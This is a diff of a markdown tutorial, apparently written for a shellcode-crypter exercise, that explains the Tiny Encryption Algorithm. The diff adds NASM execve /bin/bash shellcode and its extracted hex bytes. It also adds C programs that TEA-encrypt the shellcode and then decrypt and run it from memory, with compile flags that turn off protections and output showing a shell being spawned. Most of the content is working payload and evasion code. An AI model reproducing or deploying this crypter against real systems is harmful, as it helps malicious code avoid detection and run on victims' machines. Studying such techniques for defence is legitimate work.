@@ -25,78 +25,66 @@ Some pretty good links:
 ### 2) What is a TEA ?
 In cryptography, the Tiny Encryption Algorithm (TEA) is a block cipher notable for its simplicity of description and implementation, typically a few lines of code.
 
-The cipher details can be found below:|
+The cipher details can be found below:
 * Key sizes:	128 bits
 * Block sizes:	64 bits
 * Structure:	Feistel network
 * Rounds:	    Variable; recommended 64 Feistel rounds (32 cycles)
 
-### The encryption and decryption functions can be found below:
-```c
-/* This function is used to encrypt a message. The message is divided in 64 bits blocks and then encrypt with the 128 bits key.
-:param uint32_t v[2] -> the message to encrypt:
-:param uint32_t k[4] -> the key used to encrypt:
-*/
-void encrypt (uint32_t v[2], uint32_t k[4]) 
-{
 
-    uint32_t v0=v[0], v1=v[1], sum=0, i;           // set up //
+### 3) Shellcode used:
+```nasm
+;A simple execve using the JUMP-CALL-POP technique
+global _start
 
-    uint32_t delta=0x9E3779B9;                     // a key schedule constant //
-
-    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   // cache key //
+_start:
+	;First part: JUMP
+	jmp stage_1					    ;Jump to stage_1
 
 
-    for (i=0; i < 32; i++) {                       // basic cycle start //
-        sum += delta;
-        v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
-        v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
-    }                                              // end cycle //
-                                              
-    v[0]=v0; 
-    v[1]=v1;                                       
-}
+stage_2:
+	;Third part: POP
+	pop esi					        ;Pop the "/bin/bash" string inside esi
+	xor eax, eax			        ;Initialize eax to NULL
+	mov BYTE [esi + 9], al			;Push a NULL byte on the stack
+	mov DWORD [esi + 10], esi		;Push "/bin/bash on the stack"
+	mov DWORD [esi + 14], eax		;Push a NULL byte on the stack
 
-/* This function is used to decrypt a message. The message is divided in 64 bits blocks and then decrypt with the 128 bits key.
-:param uint32_t v[2] -> the message to decrypt:
-:param uint32_t k[4] -> the key used to decrypt:
-*/
-void decrypt (uint32_t v[2], uint32_t k[4]) 
-{
+	lea ebx, [esi]					;Initiliaze ebx to "/bin/bash"
+	lea ecx, [esi + 10]				;Initialize ecx to ["/bin/bash", NULL]
+	lea edx, [esi + 14]				;Initialize edx to NULL
+	mov al, 11						;Move execve systemcall number inside eax
 
-    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  // set up 
+	;Systemcall details:
+    ; --> execve("/bin/sh%00", ["/bin/sh%00", NULL], NULL)
+	int 0x80						;Execute systemcall
 
-    uint32_t delta=0x9e3779b9;                     // a key schedule constant 
 
-    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   // cache key //
-
-    for (i=0; i<32; i++) {                         // basic cycle start 
-        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
-        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
-        sum -= delta;
-    }                                              // end cycle 
-    v[0]=v0; 
-    v[1]=v1;
-}
+stage_1:
+	;Second part: CALL
+	call stage_2					;Use the CALL instruction to jump to stage_2
+	shell: db "/bin/bash"			;The instruction to execute using execve
 ```
-The main code can be divided in 6 funtions:
 
-| C function        | Details       |
-| ----------------- |:-------------:| -----:|
-| encrypt           | encrypt the shellcode |
-| decrypt           | decrypt the shellcode |
-| encryptBlocks     | devide the shellcode in blocks of 64 bits and then call the encrypt function      |
-| decryptBlocks     | devide the crypted shellcode in blocks of 64 bits and then call the decrypt function |
-| printShellcode    | print the length and the shellcode      |
-| main              | the main function      |
+Let's compile it and get its hexadecimal representation:
+```console
+kali@kali:/tmp/$ nasm -f elf32 -o execve.o execve.nasm
+kali@kali:/tmp/$ ld -m elf_i386 -z execstack -o execve execve.o
+kali@kali:/tmp/$ objdump -d ./execve|grep '[0-9a-f]:'|grep -v 'file'| grep -v 'format' | cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 
-### The whole C code can be found below:
+"\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"
+```
+
+
+### 4) The encryption routine:
 ```c
 #include <stdint.h>
 #include <string.h>
 #include <stdlib.h>
 #include <stdio.h>
 
+
+
 /* This function is used to encrypt a message. The message is divided in 64 bits blocks and then encrypt with the 128 bits key.
 :param uint32_t v[2] -> the message to encrypt:
 :param uint32_t k[4] -> the key used to encrypt:
@@ -119,28 +107,6 @@ void encrypt (uint32_t v[2], uint32_t k[4])
                                               
     v[0]=v0; 
     v[1]=v1;                                       
-}
-
-/* This function is used to decrypt a message. The message is divided in 64 bits blocks and then decrypt with the 128 bits key.
-:param uint32_t v[2] -> the message to decrypt:
-:param uint32_t k[4] -> the key used to decrypt:
-*/
-void decrypt (uint32_t v[2], uint32_t k[4]) 
-{
-
-    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  // set up 
-
-    uint32_t delta=0x9e3779b9;                     // a key schedule constant 
-
-    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   // cache key //
-
-    for (i=0; i<32; i++) {                         // basic cycle start 
-        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
-        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
-        sum -= delta;
-    }                                              // end cycle 
-    v[0]=v0; 
-    v[1]=v1;
 }
 
 /* This function is used to divided the shellcode in block of 64 bits and then call the encrypt function.
@@ -167,6 +133,86 @@ void encryptBlocks(char *shellcode, uint32_t *key)
         encrypt((uint32_t *)shellcode + (i * 2), key);
         i += 1;
     }
+}
+
+
+/* This function is used to get the shellcode length and print it
+:param char *shellcode -> the shellcode used:
+*/
+void printShellcode(char *shellcode)
+{
+    int i;
+    // Print the shellcode length
+    printf("Shellcode length = %d\n", strlen(shellcode));
+    // Loop for each element in the shellcode array
+    for(i = 0; i < strlen(shellcode); i++)
+    {
+        // Print their hexadecimal values
+        printf("\\x%02x", (unsigned char)(int)shellcode[i]);
+    }
+    // Add a newline
+    printf("\n");
+}
+
+
+int main()
+{
+    // 128 bits encrypt key (32 * 4 bits)
+    // A PRETTY BAD IDEA TO HARDCODE IT IN THE CODE
+    uint32_t key[4] = {0xAAAAAAAA, 0xBBBBBBBB, 0xCCCCCCCC, 0xDDDDDDDD};
+
+    // Shellcode to encrypt
+    unsigned char shellcode[] = "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68";
+
+    // Encrypt the shellcode
+    encryptBlocks(shellcode, key);
+
+    // Print the encrypted shellcode
+    printShellcode(shellcode);
+
+    return 0;
+}
+```
+
+### Let's compile and run it:
+```console
+kali@kali:/tmp$ gcc encrypt_shellcode.c -o encrypt_shellcode -m32 -fno-stack-protector -z execstack
+kali@kali:/tmp$ ./encrypt_shellcode 
+Shellcode length = 40
+\x38\xd1\x0d\x2b\xdf\xc6\xf2\x1a\x97\x2b\xfc\x72\x5e\xcf\x67\x39\x10\xa7\xd4\x41\x29\x0a\x8e\xf6\xe2\xcb\x7e\x5e\x20\xff\x86\x71\x81\xf2\xca\x0b\x7d\x1a\x3c\xff
+kali@kali:/tmp$
+```
+
+
+### 5) The decryption routine:
+```c
+#include <stdint.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+
+
+/* This function is used to decrypt a message. The message is divided in 64 bits blocks and then decrypt with the 128 bits key.
+:param uint32_t v[2] -> the message to decrypt:
+:param uint32_t k[4] -> the key used to decrypt:
+*/
+void decrypt (uint32_t v[2], uint32_t k[4]) 
+{
+
+    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  // set up 
+
+    uint32_t delta=0x9e3779b9;                     // a key schedule constant 
+
+    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   // cache key //
+
+    for (i=0; i<32; i++) {                         // basic cycle start 
+        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
+        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
+        sum -= delta;
+    }                                              // end cycle 
+    v[0]=v0; 
+    v[1]=v1;
 }
 
 
@@ -215,27 +261,20 @@ void printShellcode(char *shellcode)
     printf("\n");
 }
 
+
 int main()
 {
-    // 128 bits encrypt key (32 * 4 bits)
+    // 128 bits decrypt key (32 * 4 bits)
     uint32_t key[4] = {0xAAAAAAAA, 0xBBBBBBBB, 0xCCCCCCCC, 0xDDDDDDDD};
 
-    // Shellcode to encrypt
-    unsigned char shellcode[] = "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68";
+    // Shellcode to dencrypt
+    unsigned char shellcode[] = "\x38\xd1\x0d\x2b\xdf\xc6\xf2\x1a\x97\x2b\xfc\x72\x5e\xcf\x67\x39\x10\xa7\xd4\x41\x29\x0a\x8e\xf6\xe2\xcb\x7e\x5e\x20\xff\x86\x71\x81\xf2\xca\x0b\x7d\x1a\x3c\xff";
 
-    // Print the unencrypted shellcode
-    printShellcode(shellcode);
-    // Encrypt the shellcode
-    encryptBlocks(shellcode, key);
-
-    // Print the crypted shellcode
+    // Print the encrypted shellcode
     printShellcode(shellcode);
 
     // Decrypt the shellcode
     decryptBlocks(shellcode, key);
-
-    // Print the unencrypted shellcode
-    printShellcode(shellcode);
 
     // Convert the shellcode variable into a pointer to a function	
     int (*ret)() = (int(*)())shellcode;
@@ -247,20 +286,19 @@ int main()
 }
 ```
 
-Let's compile it and run it:
+### Let's compile and run it:
 ```console
-kali@kali:/tmp$ ./tiny_encryption_algorithm 
-Shellcode length = 40
-\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68
+kali@kali:/tmp$ gcc decrypt_shellcode.c -o decrypt_shellcode -m32 -fno-stack-protector -z execstack
+kali@kali:/tmp$ ./decrypt_shellcode 
 Shellcode length = 40
 \x38\xd1\x0d\x2b\xdf\xc6\xf2\x1a\x97\x2b\xfc\x72\x5e\xcf\x67\x39\x10\xa7\xd4\x41\x29\x0a\x8e\xf6\xe2\xcb\x7e\x5e\x20\xff\x86\x71\x81\xf2\xca\x0b\x7d\x1a\x3c\xff
-Shellcode length = 40
-\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68
 Executing Shellcode....
 
 
 kali@kali:/tmp$ id
 uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
+kali@kali:/tmp$ pwd
+/tmp
 kali@kali:/tmp$ exit
 exit
 ```
